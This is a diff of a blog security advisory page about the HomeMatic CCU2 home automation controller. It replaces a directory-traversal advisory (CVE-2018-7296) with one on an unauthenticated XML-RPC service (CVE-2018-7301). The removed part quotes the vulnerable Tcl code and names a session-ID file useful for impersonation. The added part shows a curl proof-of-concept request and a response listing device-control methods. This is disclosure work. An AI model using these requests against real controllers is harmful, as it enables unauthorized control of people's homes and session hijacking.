@@ -3,16 +3,7 @@
 	
 	<link href="//gmpg.org/xfn/11" rel="profile">
 	<meta http-equiv="content-type" content="text/html; charset=utf-8">
-	<link rel="canonical" href="http://atomic111.github.io/article/homematic-ccu2-fileread" />
-	<meta name="description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
-	<meta property="og:description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
-	<meta itemprop="image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:title" content="CVE-2018-7296: Directory Traversal / Arbitrary File Read in HomeMatic CCU2" />
-	<meta property="og:type" content="article" />
-	<meta property="og:url" content="http://atomic111.github.io/article/homematic-ccu2-fileread" />
-	<meta property="og:site_name" content="Patrick Münch Blog" />
-	<title>CVE-2018-7296: Directory Traversal / Arbitrary File Read in HomeMatic CCU2 &middot; Patrick Münch Blog</title>
+	<title>CVE-2018-7301: Unauthenticated XML-RPC Service in HomeMatic CCU2 &middot; Patrick Münch Blog</title>
 	<meta name="mobile-web-app-capable" content="yes">
 	<meta name="HandheldFriendly" content="True" />
 	<meta name="MobileOptimized" content="320" />
@@ -22,9 +13,9 @@
 	<link href="/assets/css/genericons.css" type="text/css" rel="stylesheet" />
 	<link href="/assets/css/syntax.css" type="text/css" rel="stylesheet" />
 	<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fenix:400,400italic">
-	<link rel="apple-touch-icon" href="http://atomic111.github.io/assets/images/logo.jpeg">
-	<link rel="shortcut icon" href="http://atomic111.github.io/assets/images/favicon.ico">
-	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://atomic111.github.io/atom.xml">
+	<link rel="apple-touch-icon" href="http://localhost:4000/assets/images/logo.jpeg">
+	<link rel="shortcut icon" href="http://localhost:4000/assets/images/favicon.ico">
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
 	<script type="text/javascript" src="/assets/js/jquery-2.1.0.min.js"></script>
 	
 	<script type="text/javascript" src="/assets/js/jquery.stellar.min.js"></script>
@@ -70,7 +61,7 @@
 </div>
 
 	<div id="post-info" data-stellar-ratio="0.7">
-		<h1>CVE-2018-7296: Directory Traversal / Arbitrary File Read in HomeMatic CCU2</h1>
+		<h1>CVE-2018-7301: Unauthenticated XML-RPC Service in HomeMatic CCU2</h1>
 		
 		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 21 February 2018
 	</div>
@@ -91,46 +82,107 @@
 
 <h1 id="issue-description">Issue Description</h1>
 
-<p>While analyzing the implementation of the CCU2’s web interface, one Directory Traversal vulnerabilities has been identified, which can be exploited in order to read files from the CCU2’s filesystem. This vulnerability can be exploited by unauthenticated attackers
-with access to the web interface.</p>
+<p>While analyzing the available ports of the CCU2, an open XML-RPC port without authentication has been identified. This can be exploited by sending arbitrary XML-RPC request to control the attached bidcos-devices.</p>
 
-<p>The system provides a JSON API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.</p>
+<p>The following request illustrates the problem:</p>
 
-<p>A code review of the file <code>api/methods/user/getlanguage.tcl</code> revealed that the User.getLanguage method allows unauthenticated attackers to read the first line of an arbitrary file on the CCU2’s filesystem.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -v -H "Content-Type:text/xml" -d "&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;
+&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params/&gt;&lt;/methodCall&gt;"
+http://192.168.2.145:2001
+</code></pre></div></div>
 
-<p>Please consider the following excerpt from the file <code>api/methods/user/getlanguage.tcl</code>:</p>
+<p>The following response shows that the system successfully processed the unauthenticated request:</p>
 
-<p>```
-if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}] == 0} {
-  set data [read $fp]
-  set lang [split $data “\n”]
-  close $fp
-} else {
-  set lang “0”
-}</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Server: XMLRPC++ 0.7
+Content-Type: text/xml
+Content-length: 1736
 
-<p>jsonrpc_response [lindex $lang 0]
-```</p>
-
-<p>Please note that the web server is running as root, which means that this vulnerability can be exploited in order to disclose the first line of any file on the target’s filesystem.</p>
-
-<p>One particular way to exploit this issue is to read the file /tmp/event/subscriber.list, which contains existing session IDs. These session IDs can subsequently be used to impersonate other users on the system.</p>
+&lt;?xml version="1.0"?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;array&gt;
+          &lt;data&gt;
+            &lt;value&gt;abortDeleteDevice&lt;/value&gt;
+            &lt;value&gt;activateLinkParamset&lt;/value&gt;
+            &lt;value&gt;addDevice&lt;/value&gt;
+            &lt;value&gt;addLink&lt;/value&gt;
+            &lt;value&gt;addVirtualDeviceInstance&lt;/value&gt;
+            &lt;value&gt;changeKey&lt;/value&gt;
+            &lt;value&gt;clearConfigCache&lt;/value&gt;
+            &lt;value&gt;deleteDevice&lt;/value&gt;
+            &lt;value&gt;deleteVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;determineParameter&lt;/value&gt;
+            &lt;value&gt;exit&lt;/value&gt;
+            &lt;value&gt;getAllMetadata&lt;/value&gt;
+            &lt;value&gt;getDeviceDescription&lt;/value&gt;
+            &lt;value&gt;getInstallMode&lt;/value&gt;
+            &lt;value&gt;getKeyMismatchDevice&lt;/value&gt;
+            &lt;value&gt;getLinkInfo&lt;/value&gt;
+            &lt;value&gt;getLinkPeers&lt;/value&gt;
+            &lt;value&gt;getLinks&lt;/value&gt;
+            &lt;value&gt;getMetadata&lt;/value&gt;
+            &lt;value&gt;getParamset&lt;/value&gt;
+            &lt;value&gt;getParamsetDescription&lt;/value&gt;
+            &lt;value&gt;getParamsetId&lt;/value&gt;
+            &lt;value&gt;getServiceMessages&lt;/value&gt;
+            &lt;value&gt;getValue&lt;/value&gt;
+            &lt;value&gt;getVersion&lt;/value&gt;
+            &lt;value&gt;getVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;hasVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;init&lt;/value&gt;
+            &lt;value&gt;listBidcosInterfaces&lt;/value&gt;
+            &lt;value&gt;listDevices&lt;/value&gt;
+            &lt;value&gt;listReplaceableDevices&lt;/value&gt;
+            &lt;value&gt;listTeams&lt;/value&gt;
+            &lt;value&gt;logLevel&lt;/value&gt;
+            &lt;value&gt;ping&lt;/value&gt;
+            &lt;value&gt;putParamset&lt;/value&gt;
+            &lt;value&gt;refreshDeployedDeviceFirmwareList&lt;/value&gt;
+            &lt;value&gt;removeLink&lt;/value&gt;
+            &lt;value&gt;replaceDevice&lt;/value&gt;
+            &lt;value&gt;reportValueUsage&lt;/value&gt;
+            &lt;value&gt;restoreConfigToDevice&lt;/value&gt;
+            &lt;value&gt;rssiInfo&lt;/value&gt;
+            &lt;value&gt;setBidcosInterface&lt;/value&gt;
+            &lt;value&gt;setInstallMode&lt;/value&gt;
+            &lt;value&gt;setInterfaceClock&lt;/value&gt;
+            &lt;value&gt;setLinkInfo&lt;/value&gt;
+            &lt;value&gt;setMetadata&lt;/value&gt;
+            &lt;value&gt;setRFLGWInfoLED&lt;/value&gt;
+            &lt;value&gt;setTeam&lt;/value&gt;
+            &lt;value&gt;setTempKey&lt;/value&gt;
+            &lt;value&gt;setValue&lt;/value&gt;
+            &lt;value&gt;setVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;system.listMethods&lt;/value&gt;
+            &lt;value&gt;system.methodHelp&lt;/value&gt;
+            &lt;value&gt;updateFirmware&lt;/value&gt;
+            &lt;value&gt;system.multicall&lt;/value&gt;
+          &lt;/data&gt;
+        &lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
 
 <h1 id="cve">CVE</h1>
 
-<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7296">CVE-2018-7296</a></p>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7301">CVE-2018-7301</a></p>
 
 <h1 id="cvssv3-base-score">CVSSv3 Base Score</h1>
 
-<p>CVSS Base Score: <strong>7.5</strong></p>
+<p>CVSS Base Score: <strong>5.3</strong></p>
 
-<p>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</p>
+<p>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</p>
 
 <h1 id="credit">Credit</h1>
 
-<p>Gregor Kopf of <a href="https://secfault-security.com">Secfault Security GmbH</a></p>
-
 <p>Patrick Muench of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
+
+<p>Gregor Kopf of <a href="https://secfault-security.com">Secfault Security GmbH</a></p>
 
 <h1 id="disclaimer">Disclaimer</h1>
 
@@ -144,7 +196,7 @@ if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}
 		
 	
 	<script src="https://apis.google.com/js/plusone.js"></script>
-	<div id="g-comments" class="g-comments" data-href="http://atomic111.github.io/article/homematic-ccu2-fileread" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
+	<div id="g-comments" class="g-comments" data-href="http://localhost:4000/article/homematic-ccu2-xml-rpc" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
 	<script>
 		var width = $('#comments').width() * 0.9;
 		width = Math.round(width);
@@ -165,13 +217,6 @@ if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}
 	</div>
 </div>
 
-	
-	
-	
-	
-	
-	
-
 
 <footer class="clean" style="background-image: url(/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg); height: 75%; min-height: 500px; " data-stellar-background-ratio="0.5" data-stellar-horizontal-offset="50" data-stellar-vertical-offset="50">
 	<div id="nav-icon" style="top: 60px;" data-stellar-ratio="0.8">
@@ -179,14 +224,14 @@ if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}
 	</div>
 	<div id="post-info" data-stellar-ratio="0.5" data-stellar-vertical-offset="120">
 		<h3>Read next</h3>
-		<a href="/article/homematic-ccu2-remote-code-execution">
-			<h1>CVE-2018-7297: Remote Code Execution in HomeMatic CCU2</h1>
+		<a href="/article/homematic-ccu2-fileread">
+			<h1>CVE-2018-7296: Directory Traversal / Arbitrary File Read in HomeMatic CCU2</h1>
 			
 				<h2></h2>
 			
 		</a>
 	</div>
-	<p class="copyright">&copy;2018, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
+	<p class="copyright">&copy;2019, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
 </footer>
 <script src="/assets/js/smooth-scroll.js"></script>
 
